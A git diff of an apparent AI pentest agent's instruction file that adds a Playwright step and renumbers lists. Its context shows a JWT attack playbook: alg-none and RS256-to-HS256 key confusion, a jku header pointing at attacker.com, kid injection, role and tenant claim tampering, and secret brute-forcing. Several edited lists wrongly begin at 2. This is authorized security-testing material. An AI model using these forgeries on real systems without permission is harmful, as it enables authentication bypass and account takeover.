@@ -20,11 +20,12 @@ This agent works alongside the Dristi MCP server and WSTG methodology:
 2. **Deep testing** — See [Deep Testing](../docs/deep-testing.md) for request mutation, fuzzing, and entry point techniques. Run before class-specific payloads.
 
 3. **BurpSuite pro workflow — See [Burp Suite Flow](../docs/burp-flow.md) for full Burp MCP tool reference (proxy, repeater, intruder, collaborator, scanner, organizer) and per-phase workflow. **JWT technique**: Use `burp_create_repeater_tab()` to send modified JWTs with `alg: none`, RS256→HS256 public-key confusion, `kid` injection (SQLi/path-traversal), and blank password signing. Use `burp_base64_decode()` on JWT header/payload before editing, then `burp_base64_encode()` after. Use `burp_generate_collaborator_payload()` in `jwks_uri` for SSRF callback.
-4. **Find vulnerabilities** → `log_finding()` or `findings_add_vuln()` to persist to SQLite
-5. **Log findings** → `findings_add_vuln(engagement_id, title, severity, ..., test_id="WSTG-ATHN-05")`
-6. **Track coverage** → `track_test(engagement_id, test_id="WSTG-ATHN-05", status="completed", notes=...)`
-7. **Chain findings** → `findings_add_chain()` to record multi-step attack paths
-8. **Generate report** → `findings_handoff()` for cross-session handoff or `generate_report()` for final output
+4. **Playwright browser** — Use `playwright_browser_*` tools for active testing, SPA interaction, and PoC evidence. See [Browser Testing](../docs/browser-testing.md) for full reference.
+5. **Find vulnerabilities** → `log_finding()` or `findings_add_vuln()` to persist to SQLite
+6. **Log findings** → `findings_add_vuln(engagement_id, title, severity, ..., test_id="WSTG-ATHN-05")`
+7. **Track coverage** → `track_test(engagement_id, test_id="WSTG-ATHN-05", status="completed", notes=...)`
+8. **Chain findings** → `findings_add_chain()` to record multi-step attack paths
+9. **Generate report** → `findings_handoff()` for cross-session handoff or `generate_report()` for final output
 
 ## PayloadsAllTheThings Reference
 
@@ -97,22 +98,22 @@ jjwt                                  // Java — check for algorithm enforcemen
 
 ### Phase 1 — Recon and decode
 
-1. Capture a valid JWT from any authenticated request
-2. Decode it:
+2. Capture a valid JWT from any authenticated request
+3. Decode it:
 ```bash
 echo "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0" | \
   python3 -c "import sys,base64,json; parts=sys.stdin.read().strip().split('.'); \
   [print(json.dumps(json.loads(base64.urlsafe_b64decode(p+'==').decode()),indent=2)) for p in parts[:2]]"
 ```
-3. Note the `alg` field — target RS256, ES256, PS256 (asymmetric algos vulnerable to confusion)
-4. Find the public key: `/.well-known/jwks.json`, app source, TLS cert, `/api/auth/public-key`
+4. Note the `alg` field — target RS256, ES256, PS256 (asymmetric algos vulnerable to confusion)
+5. Find the public key: `/.well-known/jwks.json`, app source, TLS cert, `/api/auth/public-key`
 
 ### Phase 2 — RS256→HS256 algorithm confusion
 
 If `alg` is RS256:
-1. Retrieve the server's public key in PEM format
-2. Sign a new JWT using the **public key** as the HMAC-SHA256 secret, with `alg: HS256`
-3. The vulnerable server uses the public key to verify — and for HS256, the "secret" is the public key, which the attacker has
+2. Retrieve the server's public key in PEM format
+3. Sign a new JWT using the **public key** as the HMAC-SHA256 secret, with `alg: HS256`
+4. The vulnerable server uses the public key to verify — and for HS256, the "secret" is the public key, which the attacker has
 
 ```python
 import jwt, base64
@@ -177,10 +178,10 @@ Some implementations allow the token to specify where to fetch the signing key:
 ```json
 {"alg":"RS256","jku":"https://attacker.com/fake-jwks.json","kid":"mykey"}
 ```
-1. Generate an RSA keypair
-2. Publish the public key as JWKS at your server
-3. Sign the JWT with your private key
-4. Set `jku` to your JWKS URL and `kid` to match
+2. Generate an RSA keypair
+3. Publish the public key as JWKS at your server
+4. Sign the JWT with your private key
+5. Set `jku` to your JWKS URL and `kid` to match
 
 If the server fetches and trusts the external `jku` → Critical SSRF + auth bypass.
 
@@ -208,10 +209,10 @@ python3 jwt_tool.py <token> -X e
 
 ### Phase 7 — Claim injection and expiry manipulation
 
-1. **Role escalation:** Decode JWT, change `"role":"user"` to `"role":"admin"`, re-sign
-2. **Expiry removal:** Remove `exp` claim — some validators skip expiry if field absent
-3. **nbf bypass:** Set `nbf` to past, `exp` to far future
-4. **Cross-tenant:** Change `org_id`, `tenant`, `account_id` to another user's value
+2. **Role escalation:** Decode JWT, change `"role":"user"` to `"role":"admin"`, re-sign
+3. **Expiry removal:** Remove `exp` claim — some validators skip expiry if field absent
+4. **nbf bypass:** Set `nbf` to past, `exp` to far future
+5. **Cross-tenant:** Change `org_id`, `tenant`, `account_id` to another user's value
 
 **Weak secret bruteforce:**
 ```bash
